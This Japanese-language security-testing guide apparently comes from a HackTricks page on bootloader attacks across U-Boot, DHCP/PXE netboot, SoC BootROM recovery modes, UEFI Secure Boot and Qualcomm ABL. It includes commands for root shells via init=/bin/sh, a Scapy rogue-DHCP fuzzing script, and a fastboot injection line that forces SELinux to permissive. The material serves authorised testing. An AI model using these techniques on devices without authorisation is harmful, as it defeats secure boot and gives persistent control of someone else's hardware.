# Bootloader Testing

{{#include ../../banners/hacktricks-training.md}}

以下の手順は、デバイスの startup configuration を変更し、U-Boot や UEFI-class loader などの bootloader をテストする際に推奨されます。early code execution の取得、signature/rollback protection の評価、recovery または network-boot path の悪用に重点を置きます。

関連項目: bl2_ext patching による MediaTek secure-boot bypass:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins and environment abuse

1. interpreter shell にアクセスする
- boot 中に、`bootcmd` が実行される前に既知の break key（多くの場合は任意のキー、0、space、または board 固有の "magic" sequence）を押して、U-Boot prompt に移行します。<sup>[[1]](#references)</sup>

2. boot state と variables を確認する
- Useful commands:
- `printenv`（environment を dump）
- `bdinfo`（board info、memory address）
- `help bootm; help booti; help bootz`（サポートされている kernel boot method）
- `help ext4load; help fatload; help tftpboot`（利用可能な loader）

3. boot argument を変更して root shell を取得する
- `init=/bin/sh` を追加すると、kernel は通常の init の代わりに shell を起動します。
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. TFTP server から Netboot する
- network を設定し、LAN から kernel/fit image を取得します。
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. environment によって変更を永続化する
- env storage が write-protect されていなければ、control を永続化できます。
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- fallback path に影響する `bootcount`、`bootlimit`、`altbootcmd`、`boot_targets` などの variables を確認します。値の設定を誤ると、shell への break を繰り返し可能になる場合があります。

6. debug/unsafe feature を確認する
- 次の項目を探します: `bootdelay` > 0、`autoboot` の無効化、制限のない `usb start; fatload usb 0:1 ...`、serial 経由で `loady`/`loads` を実行できる機能、信頼できない media からの `env import`、signature check なしでロードされる kernel/ramdisk。

7. U-Boot image/verification testing
- platform が FIT image による secure/verified boot を主張している場合、unsigned image と tampered image の両方を試します。
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` が存在しない場合や、legacy の `verify=n` behavior では、任意の payload を boot できることがよくあります。
- 単純な allow/deny result だけで判断しないでください。最近の FIT research では、verification path 自体が pre-auth attack surface になり得ることが示されています。外部保存された FIT data（`data-offset`、`data-position`、`data-size`）、signed configuration selection、`loadables`、overlay / `extra-conf` handling を negative-test します。
- matching source tree がある場合、`test/vboot/vboot_test.sh` は、実 hardware に触れる前に U-Boot sandbox で FIT verification behavior を再現する高速な方法です。<sup>[[10]](#references)</sup>

8. Standard Boot（`bootstd`）、`extlinux`、script bootflow
- modern U-Boot build では、`bootcmd` は単に Standard Boot の wrapper であることが多くあります。つまり、visible environment が無害に見える場合でも、writeable media、PXE、または SPI flash が実際の trust boundary になる可能性があります。
- `extlinux` bootmeth は `/` と `/boot` 配下の `extlinux/extlinux.conf` を検索します。script bootmeth は最初に `boot.scr.uimg`、次に `boot.scr` を検索します。network boot では、script filename は `boot_script_dhcp` から取得される場合があります。
- Useful triage commands:
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- テストする abuse case: `boot_targets` で attacker-controlled USB/SD media が先に指定されている、writeable な `/boot/extlinux/extlinux.conf`、rogue TFTP による `boot.scr` の提供、または `script_offset_f` による SPI-backed script execution。
- platform が FIT verification に依存している場合、configuration が configuration level で署名されており、image ごとの署名だけになっていないことを確認します。`required-mode=all` は、任意の単一の required key を受け入れるより強力です。

## Network-boot surface（DHCP/PXE）と rogue server

9. PXE/DHCP parameter fuzzing
- U-Boot の legacy BOOTP/DHCP handling には memory-safety issue が発生したことがあります。たとえば CVE‑2024‑42040 は、crafted DHCP response による memory disclosure について説明しており、U-Boot memory の bytes が wire 上に leak する可能性があります。<sup>[[4]](#references)</sup> DHCP/PXE code path に対して、過度に長い値や edge-case value（option 67 bootfile-name、vendor option、file/servername field）を使って exercise し、hang/leak の有無を観察します。
- netboot 中に boot parameter を stress する最小 Scapy snippet:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- また、PXE filename field が OS-side provisioning script に連鎖する際、sanitization なしで shell/loader logic に渡されていないか確認します。

10. Rogue DHCP server command injection testing
- rogue DHCP/PXE service をセットアップし、filename または option field に characters を injection して、boot chain の後続 stage で command interpreter に到達できるか試します。Metasploit の DHCP auxiliary、`dnsmasq`、または custom Scapy script が適しています。最初に lab network を隔離してください。

## 通常の boot を上書きする SoC ROM recovery mode

多くの SoC は BootROM の "loader" mode を公開しており、flash image が無効な場合でも USB/UART 経由で code を受け入れます。secure-boot fuse が blown されていなければ、chain の非常に早い段階で arbitrary code execution を取得できます。

- NXP i.MX（Serial Download Mode）
- Tools: `uuu`（mfgtools3）または `imx-usb-loader`。
- Example: `imx-usb-loader u-boot.imx` で custom U-Boot を RAM に push して実行します。
- Allwinner（FEL）
- Tool: `sunxi-fel`。
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` または `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`。
- Rockchip（MaskROM）
- Tool: `rkdeveloptool`。
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` で loader を stage し、custom U-Boot を upload します。

device の secure-boot eFuse/OTP が burned されているかを評価します。burned されていなければ、BootROM download mode は first-stage payload を SRAM/DRAM から直接実行することで、higher-level verification（U-Boot、kernel、rootfs）を bypass することが頻繁にあります。

## UEFI/PC-class bootloader: quick checks

11. ESP tampering、rollback、key-enrollment testing
- EFI System Partition（ESP）を mount し、loader component を確認します: `EFI/Microsoft/Boot/bootmgfw.efi`、`EFI/BOOT/BOOTX64.efi`、`EFI/ubuntu/shimx64.efi`、`grubx64.efi`、vendor logo path。
- 可能であれば、OS から Secure Boot state と key database を dump します。
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- platform が Setup Mode である、unauthenticated key enrollment を受け入れる、または test/default Platform Key（PKfail class）を搭載している場合、local admin または physical attacker は自身の KEK/db を enrollment し、Secure Boot を “enabled” に見せたまま arbitrary EFI binary を boot できます。<sup>[[3]](#references)</sup>
- Secure Boot revocation（dbx）が current でない場合、downgrade した、または既知の vulnerable な signed boot component での boot を試します。platform が old shim/bootmanager を引き続き trust している場合、ESP から自身の kernel または `grub.cfg` をロードして persistence を取得できることがあります。

12. Stale shim / SBAT / dbx revocation testing
- Old Microsoft-signed shim と vendor fork は、revocation が stale である場合、BYOVD-style bootkit path として機能する可能性があります。isolated lab で historically vulnerable な shim を ESP に配置し、自身の `grubx64.efi` または kernel を chainload できるか試します。<sup>[[11]](#references)</sup>
- Quick triage:
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- shim が revocation list にあるにもかかわらず実行される場合、firmware/OS の `dbx` update が stale であるか、upstream SBAT protection を継承していない forked loader を trust しています。

13. Boot logo parsing bug（LogoFAIL class）
- 複数の OEM/IBV firmware には、boot logo を処理する DXE の image-parsing flaw に対して vulnerable なものがありました。attacker が vendor-specific path（例: `\EFI\<vendor>\logo\*.bmp`）の ESP に crafted image を配置して reboot できる場合、Secure Boot が enabled でも early boot 中に code execution が可能になることがあります。platform が user-supplied logo を受け入れるか、またその path が OS から writeable かをテストします。<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16) trust gap

Qualcomm の ABL が **Generic Bootloader Library（GBL）** をロードする Android 16 device では、ABL が `efisp` partition からロードする UEFI app を **authenticate** するか確認します。ABL が UEFI app の **presence** だけを確認し、signature を verify しない場合、`efisp` への write primitive は boot 時の **pre-OS unsigned code execution** につながります。<sup>[[6]](#references)[[7]](#references)</sup>

Practical check と abuse path:

- **efisp write primitive**: `efisp` に custom UEFI app を書き込む方法が必要です（root/privileged service、OEM app bug、recovery/fastboot path）。これがなければ、GBL loading gap に直接到達することはできません。<sup>[[6]](#references)</sup>
- **fastboot OEM argument injection**（ABL bug）: 一部の build は `fastboot oem set-gpu-preemption` の extra token を受け入れ、kernel cmdline に append します。これを利用して permissive SELinux を強制し、protected partition への write を有効化できます。
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
device が patched されている場合、command は extra argument を reject するはずです。<sup>[[5]](#references)[[6]](#references)</sup>
- **persistent flag による bootloader unlock**: boot-stage payload は persistent unlock flag（例: `is_unlocked=1`、`is_unlocked_critical=1`）を flip し、OEM server/approval gate なしで `fastboot oem unlock` を emulate できます。これは次回 reboot 後も継続する posture change です。<sup>[[6]](#references)</sup>

Defensive/triage note:

- ABL が `efisp` の GBL/UEFI payload に対して signature verification を実行するか確認します。実行しない場合、`efisp` を high-risk persistence surface として扱います。
- ABL fastboot OEM handler が **argument count を validate** し、additional token を reject するよう patched されているか追跡します。<sup>[[8]](#references)[[9]](#references)</sup>

## Hardware caution

early boot 中に SPI/NAND flash を操作する際（例: read を bypass するために pin を ground する場合）は注意し、必ず flash datasheet を確認してください。タイミングを誤った short は device または programmer を破損させる可能性があります。

## Notes and additional tips

- `env export -t ${loadaddr}` と `env import -t ${loadaddr}` を試し、RAM と storage の間で environment blob を移動します。一部の platform では removable media から authentication なしで env を import できます。
- `extlinux.conf` 経由で boot する Linux-based system で persistence を得るには、signature check が enforced されていない場合、boot partition の `APPEND` line を変更して（`init=/bin/sh` または `rd.break` を injection して）十分なことがよくあります。
- target が dual-slot / A/B update を使用している場合、[firmware analysis overview](README.md) の anti-rollback と slot-desync technique を確認し、bootloader 自体の外部にある updater-only trust gap を見落とさないようにします。
- userland が `fw_printenv/fw_setenv` を提供している場合、`/etc/fw_env.config` が実際の env storage と一致するか確認します。offset の設定を誤ると、別の MTD region を read/write することになります。

## References

- [1] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Finding LogoFAIL: The dangers of image parsing during system boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Untrusted Platform Keys Undermine Secure Boot on UEFI Ecosystem](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040 Detail](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: Unlocking Xiaomi via two unsanitized strings](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL exploit lets attackers unlock bootloaders](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generic Bootloader (GBL) architecture](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Fix propagation of untrusted input into kernel cmdline](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: add check for set-hw-fence-value command](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Unfit to boot: breaking U-Boot's FIT signature verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Vulnerability Note VU#616257 - Microsoft-signed UEFI shim bootloaders vulnerable to Secure Boot bypass](https://kb.cert.org/vuls/id/616257)

{{#include ../../banners/hacktricks-training.md}}
